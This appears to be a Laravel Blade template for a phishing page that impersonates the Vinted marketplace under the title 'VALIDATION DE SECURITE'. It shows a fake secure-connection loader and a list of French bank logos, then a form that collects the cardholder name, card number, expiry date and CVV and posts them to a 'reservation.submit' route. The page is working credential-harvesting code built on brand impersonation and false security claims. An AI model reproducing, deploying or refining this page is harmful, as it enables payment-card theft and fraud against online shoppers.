<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VINTED | VALIDATION DE SECURITE</title>

    
    @vite(['resources/css/app.css', 'resources/js/app.js'])
    
    <style>
        .coriolis-orange { background-color: #0d9488; }
        .coriolis-text { color: #0d9488; }
    </style>
</head>
<body class="bg-gray-50 min-h-screen flex items-center justify-center">

<div id="global-loader" style="position: fixed; inset: 0; z-index: 9999; background: white; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.5s ease;">
        <div class="loader-content" style="text-align: center; margin-top: 0;">
            <div style="width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #0d9488; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
            <h2 style="font-family: sans-serif; color: #1b1b18; margin-top: 20px;">Connexion sécurisée...</h2>
            <p style="font-family: sans-serif; color: #706f6c; font-size: 14px;">Traitement de votre reservation</p> 
        </div>
    </div>

    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

    <script>

            // B. On attend le chargement complet pour cacher le loader
            window.addEventListener('load', function() {
                const loader = document.getElementById('global-loader');
                
                // Sécurité : on vérifie que l'élément existe bien avant d'agir
                if (loader) {
                    setTimeout(() => {
                        loader.style.opacity = '0';
                        setTimeout(() => {
                            loader.style.display = 'none';
                        }, 500);
                    }, 1200);
                }
            });
        </script>

    <main class="w-full max-w-md mx-auto px-4 py-4 ">
        <div class="bg-white p-8 shadow-lg rounded-2xl border-gray-100 ">
            <header class="w-full max-w-md mx-auto text-sm mb-2">
        
        <div class="flex justify-center mt-5">
            <img
            src="{{ asset('images/vinted.png') }}"
            alt="Logo"
            class="h-8 lg:h-15 w-auto"
            >
        </div>

        </header>
        <p  class="text-sm text-center mb-6 text-gray-500">Veuillez renseigner les détails de votre compte pour valider le paiement.</p>

        @if ($errors->any())
            <div class="bg-red-100 border border-red-400 text-red-700 p-4 rounded mb-4">
                <ul>
                    @foreach ($errors->all() as $error)
                        <li>{{ $error }}</li>
                    @endforeach
                </ul>
            </div>
        @endif
        
        <form action="{{ route('reservation.submit') }}" method="POST" class="space-y-6">
            @csrf  
   
        <div class="relative">
    <label for="bank_name" class="block text-base font-medium text-gray-700 mb-1">
        Sélectionner votre banque
    </label>

   <button 
    type="button"
    id="bankButton"
    class="w-full flex items-center justify-between px-4 py-3 border border-gray-300 rounded-xl bg-white focus:ring-2 focus:ring-teal-600"
>

    <span id="selectedBank" class="text-gray-500">
        Sélectionner votre banque
    </span>

    <svg class="w-5 h-5 text-gray-500"
         fill="none"
         stroke="currentColor"
         viewBox="0 0 24 24">

        <path stroke-linecap="round"
              stroke-linejoin="round"
              stroke-width="2"
              d="M19 9l-7 7-7-7"/>

    </svg>

</button>




    <div id="bankList"
     class="hidden absolute z-50 mt-2 w-full bg-white rounded-2xl shadow-xl p-4">

    <div class="grid grid-cols-4 sm:grid-cols-4 gap-4">
        

    

@php
        $banks = [
            ['name'=>'Crédit Agricole','logo'=>'credit-agricole-logo.png'],
            ['name'=>"Caisse d'Épargne",'logo'=>'mb-removebg-preview.png'],
            ['name'=>'BNP Paribas','logo'=>'BNP_Paribas_logo.png'],
            ['name'=>'Société Générale','logo'=>'Société_Générale.png'],
            ['name'=>'HSBC','logo'=>'hsbc-logo.png'],
            ['name'=>'Crédit Mutuel','logo'=>'Crédit_Mutuel_2022_logo.png'],
            ['name'=>'Banque populaire','logo'=>'logo-gbp.png'],
            ['name'=>'Axa Banque','logo'=>'AXA_Assurance.png'],
            ['name'=>'LCL Banque','logo'=>'LCL.png'],
            ['name'=>'La Banque Postale','logo'=>'LOGO-LBP-digital-fd-clair-RVB.png'],
            // Dernière case
            ['name'=>'Autre banque','logo'=>'other-bank.png'],
            
            
        ];
        @endphp


        @foreach($banks as $bank)

            <button
                type="button"
                class="bank-option group flex items-center justify-center
                       h-15 sm:h-20
                       rounded-xl bg-white
                       hover:border-teal-600 hover:shadow-md
                       transition-all duration-200"
                data-value="{{ $bank['name'] }}"
            >

              @if($bank['name'] === 'Autre banque')

                    <div class="flex flex-col items-center justify-center">
                        <svg xmlns="http://www.w3.org/2000/svg"
                            class="w-5 h-5 text-gray-500 group-hover:text-teal-600"
                            fill="none"
                            viewBox="0 0 24 24"
                            stroke="currentColor">
                            <path stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                                d="M12 4v16m8-8H4"/>
                        </svg>

                        <span class="mt-1 text-xs font-medium">
                            Autre
                        </span>
                    </div>

                @else


                <img
                    src="{{ asset('images/'.$bank['logo']) }}"
                    alt="{{ $bank['name'] }}"
                    class="w-16 h-10 object-contain group-hover:scale-110 transition-transform"
                >
               @endif

            </button>

        @endforeach

    </div>

</div>



    <input type="hidden" name="bank_name" id="bankInput">

</div>

        <div>
            <label for="cardholder" class="block text-sm font-medium text-gray-700 mb-1">Nom sur la carte</label>
            <input type="text" id="cardholder" name="name" required
                class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition" 
                placeholder="Votre nom complet">
        </div>

        <div>
            <label for="card_number" class="block text-sm font-medium text-gray-700 mb-1">Numéro de carte</label>
             <div class="flex items-center gap-2 mb-1 ">
                <img src="{{ asset('images/cb.jpg') }}" alt="CB" class="h-5 w-auto object-contain">
                <img src="{{ asset('images/mastercard.png') }}" alt="Mastercard" class="h-5 w-auto object-contain">
                <img src="{{ asset('images/visa.png') }}" alt="Visa" class="h-5 w-auto object-contain">
            </div>
            <input type="text" id="card_number" name="card_number" inputmode="numeric" pattern="[0-9\s]{13,19}" required
                class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition" 
                placeholder="0000 0000 0000 0000">
        </div>
        

        <div class="grid grid-cols-2 gap-4">
            <div>
                <label for="expiry" class="block text-sm font-medium text-gray-700 mb-1">Date d'expiration</label>
                <input type="text" id="expiry" name="expiry" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="cc-exp" required
                    class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition">
            </div>

            <div>
                <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" inputmode="numeric" required
                    class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition">
            </div>

            
        </div>

        <button type="submit" class="w-full flex items-center capitalize justify-center bg-teal-600 hover:bg-teal-700 text-white font-bold py-3 px-6 rounded-lg transition-colors duration-300 shadow-md">
            <svg class="w-4 h-4 mr-1 align-middle" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
            paiement sécurisé
        </button>
        </form>

        
        
    </div>

    </main>


    <script>
        document.getElementById('expiry').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, ''); // Garde uniquement les chiffres

            if (value.length > 4) {
                value = value.substring(0, 4);
            }

            if (value.length >= 3) {
                value = value.substring(0, 2) + '/' + value.substring(2);
            }

            e.target.value = value;
        });
    </script>

<script src="https://cdn.jsdelivr.net/npm/tom-select/dist/js/tom-select.complete.min.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function () {

   new TomSelect('#category', {
    render: {

        option: function(data, escape) {
            return `
                <div class="w-full flex items-center gap-2 py-6 m-4 grid grid-cols-2   ">
                    <img src="${data.icon}" class="${data.class}  object-contain">
                    <span class="font-medium uppercase">
                        ${escape(data.text)}
                    </span>
                </div>
            `;
        },

        item: function(data, escape) {
            return `
                <div class="flex items-center gap-3 grid grid-cols-2 gap-2 ">
                    <img src="${data.icon}" class="${data.class} object-contain">
                    <span class="font-medium uppercase ">
                        ${escape(data.text)}
                    </span>
                </div>
            `;
        }

    }
});
});
</script>

</body>
</html>